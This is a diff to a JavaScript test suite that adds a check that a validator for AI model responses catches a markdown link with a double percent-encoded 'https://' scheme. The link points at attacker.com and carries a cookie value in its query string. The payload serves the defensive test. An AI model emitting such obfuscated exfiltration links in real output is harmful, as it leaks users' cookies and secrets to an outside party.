@@ -283,6 +283,22 @@ const runTests = async () => {
     throw new Error(`❌ Failure: HTML entity-encoded URL scheme exfiltration was NOT blocked! res10=${res10}, compromised=${window.VORO_COMPROMISED}`);
   }
 
+  // --- TEST 11: Multi-Pass / Nested Percent-Encoded URL Scheme Exfiltration Attempt ---
+  console.log("🛡️ Test 11: Verifying multi-pass percent-encoded URL scheme exfiltration detection...");
+  lockdownCount = 0;
+  window.VORO_COMPROMISED = false;
+  window.VORO_DECEPTION_ACTIVE = false;
+
+  // %2568%2574%2574%2570%2573%253a%252f%252f is nested percent-encoded "https://"
+  const percentSchemePayload = "Check link: [leak](%2568%2574%2574%2570%2573%253a%252f%252fattacker.com/exfil?cookie=secret_val)";
+  const res11 = validateAIResponse(percentSchemePayload);
+
+  if (res11 === "[SECURITY_VIOLATION_DETECTED]" && lockdownCount > 0 && window.VORO_COMPROMISED) {
+    console.log("✅ Success: Multi-pass percent-encoded URL scheme exfiltration attempt was successfully detected and locked down!");
+  } else {
+    throw new Error(`❌ Failure: Multi-pass percent-encoded URL scheme exfiltration was NOT blocked! res11=${res11}, compromised=${window.VORO_COMPROMISED}`);
+  }
+
   console.log("\n🎉 ALL EXFILTRATION SECURITY VERIFICATION TESTS PASSED SUCCESSFULLY!");
   console.log("=========================================");
   process.exit(0);
